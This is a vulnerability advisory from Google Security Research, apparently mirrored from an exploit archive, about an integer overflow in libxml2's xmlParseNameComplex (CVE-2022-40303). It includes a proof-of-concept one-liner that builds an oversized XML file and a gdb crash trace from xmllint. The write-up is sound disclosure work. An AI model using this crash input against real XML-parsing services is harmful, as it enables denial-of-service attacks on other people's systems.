@@ -1,0 +1,72 @@
+id: 38064
+date: 11/16/2022
+title: libxml2 xmlParseNameComplex Integer Overflow Vulnerability
+author: Google Security Research
+cves: CVE-2022-29824, CVE-2022-40303
+
+libxml2: Integer overflow in xmlParseNameComplex
+
+libxml2 is vulnerable to an integer overflow in `xmlParseNameComplex` when an attribute list has a very long name (name is >= 2**32 characters).
+
+```
+static const xmlChar *xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
+int len = 0, l;
+[...]
+return (xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
+}
+```
+
+If the name is greater than or equal to 2**32 characters, then `len` overflows. The calculation for the second argument to xmlDictLookup (`ctxt->input->cur - len`) will point to an address outside of the buffer such as adding 0x80000000 to `cur`.
+
+Exploiting this issue using static XML requires that the `XML_PARSE_HUGE` flag is used to disable hardcoded parser limits. Though similar to Felix’s report [\(CVE-2022-29824\)](https://gitlab.gnome.org/GNOME/libxml2/-/issues/351) it may be possible to trigger without the flag using XSLT or xpath though I didn’t look into this.
+
+_Note: XML_PARSE_HUGE looks very brittle in general. Signed 32-bit integers are widely used as sizes/offsets throughout the codebase, a lot of the helper functions don’t handle inputs larger than 4GB correctly and fuzzers won’t trigger these edge cases. Maybe that flag should include a security warning? Some security critical projects like xmlsec enable it by default (https://github.com/lsh123/xmlsec/commit/3786af10953630cd2bb2b57ce31c575f025048a8) which seems risky._
+
+Proof of Concept:
+```
+$ python3 -c 'print("<!DOCTYPE doc [\n<!ATTLIST src " + "a"*(0x80000000) + " IDREF #IMPLIED>")' > name_big.xml
+$ ./xmllint --huge /tmp/name_big.xml
+
+
+Program received signal SIGSEGV, Segmentation fault.
+__strlen_evex () at ../sysdeps/x86_64/multiarch/strlen-evex.S:77
+77  ../sysdeps/x86_64/multiarch/strlen-evex.S: No such file or directory.
+(gdb) bt
+#0  __strlen_evex () at ../sysdeps/x86_64/multiarch/strlen-evex.S:77
+#1  0x00007ffff7e3a374 in xmlDictLookup (dict=0x421a50, name=0x7ffff795602e <error: Cannot access memory at address 0x7ffff795602e>, len=-2147483648)
+    at /usr/local/google/home/maddiestone/libxml2/dict.c:878
+#2  0x00007ffff7e6607a in xmlParseNameComplex (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3617
+#3  0x00007ffff7e65395 in xmlParseName (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3682
+#4  0x00007ffff7e6f27e in xmlParseAttributeListDecl (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:6729
+#5  0x00007ffff7e71a00 in xmlParseMarkupDecl (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:7754
+#6  0x00007ffff7e79ed1 in xmlParseInternalSubset (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:9407
+#7  0x00007ffff7e79a16 in xmlParseDocument (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:12165
+#8  0x00007ffff7e819fe in xmlDoRead (ctxt=0x421750, URL=0x0, encoding=0x0, options=4784128, reuse=0)
+    at /usr/local/google/home/maddiestone/libxml2/parser.c:17044
+#9  0x00007ffff7e81ad7 in xmlReadFile (filename=0x7fffffffdec7 "../qname_big.xml", encoding=0x0, options=4784128)
+    at /usr/local/google/home/maddiestone/libxml2/parser.c:17109
+#10 0x000000000040a135 in parseAndPrintFile (filename=0x7fffffffdec7 "../qname_big.xml", rectxt=0x0)
+    at /usr/local/google/home/maddiestone/libxml2/xmllint.c:2366
+#11 0x0000000000407574 in main (argc=3, argv=0x7fffffffdac8) at /usr/local/google/home/maddiestone/libxml2/xmllint.c:3757
+(gdb) up
+#1  0x00007ffff7e3a374 in xmlDictLookup (dict=0x421a50, name=0x7ffff795602e <error: Cannot access memory at address 0x7ffff795602e>, len=-2147483648)
+    at /usr/local/google/home/maddiestone/libxml2/dict.c:878
+878            l = strlen((const char *) name);
+(gdb) up
+#2  0x00007ffff7e6607a in xmlParseNameComplex (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3617
+3617        return (xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
+(gdb) p/x len
+$5 = 0x80000000
+(gdb) p/x $_siginfo
+$6 = {si_signo = 0xb, si_errno = 0x0, si_code = 0x1, _sifields = {_pad = {0xf795602e, 0x7fff, 0x0 <repeats 26 times>}, _kill = {si_pid = 0xf795602e,
+      si_uid = 0x7fff}, _timer = {si_tid = 0xf795602e, si_overrun = 0x7fff, si_sigval = {sival_int = 0x0, sival_ptr = 0x0}}, _rt = {si_pid = 0xf795602e,
+      si_uid = 0x7fff, si_sigval = {sival_int = 0x0, sival_ptr = 0x0}}, _sigchld = {si_pid = 0xf795602e, si_uid = 0x7fff, si_status = 0x0, si_utime = 0x0,
+      si_stime = 0x0}, _sigfault = {si_addr = 0x7ffff795602e, _addr_lsb = 0x0, _addr_bnd = {_lower = 0x0, _upper = 0x0}}, _sigpoll = {
+      si_band = 0x7ffff795602e, si_fd = 0x0}}}
+(gdb) p/x ctxt->input->cur
+$7 = 0x7fff7795602e
+```
+
+Related CVE Numbers: CVE-2022-29824,CVE-2022-40303.
+
+#  0day.today [2023-03-23]  #
